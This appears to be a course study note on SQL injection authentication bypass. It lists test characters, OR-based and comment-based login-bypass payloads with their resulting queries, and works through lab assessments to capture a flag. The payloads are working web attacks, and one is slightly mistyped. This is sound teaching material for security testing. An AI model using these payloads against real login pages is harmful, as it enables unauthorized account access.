# Subverting Query Logic

## Authentication Bypass

Example of original query at backend.

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

### Test if web is vulnerable to SQLi

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

> In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.

If it's vulnerable it will throw error instead of intended message 'i.e., login failed, authentication failed, etc.'

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```

### Bypass using OR Injection

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

* If username is `admin`\
  `OR`
* If `1=1` return `true` 'which always returns `true`'\
  `AND`
* If password is `something`

#### Assessment

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption><p>vuln to SQLi</p></figcaption></figure>

```sql
SELECT * FROM logins WHERE username=''' AND password = '';
```

**bypass login**

<pre><code><strong># Username
</strong>asdf' or '1'='1
# Password
asdf' or '1'='1
</code></pre>

```sql
SELECT * FROM logins WHERE username='asdf' or '1'='1' AND password = 'asdf' or '1'='1';
```

<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption><p>Bypassed</p></figcaption></figure>

```
# Username
tom' ='1'='1
# Password
anything
```

since the username query is true by it self, the password could be anything and the statement will still be true.

### Bypass using Comments

We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/`

```shell-session
mysql> SELECT username FROM logins; -- Selects usernames from the logins table 

+---------------+
| username      |
+---------------+
| admin         |
| administrator |
| john          |
| tom           |
+---------------+
4 rows in set (0.00 sec)
```

{% hint style="info" %}
if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symb
{% endhint %}

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

#### Assessment

Login as the user with the id 5 to get the flag.

Original query

```sql
SELECT * FROM logins WHERE (username=''' AND id > 1) AND password = 'xxx';
```

Payload

```
# Username
adasdfmin') OR id = 5 -- -
```

Final query

<pre class="language-sql"><code class="lang-sql"><strong>SELECT * FROM logins WHERE (username='adasdfmin') OR id = 5 -- -' AND id > 1) AND password = 'xxx';
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>



























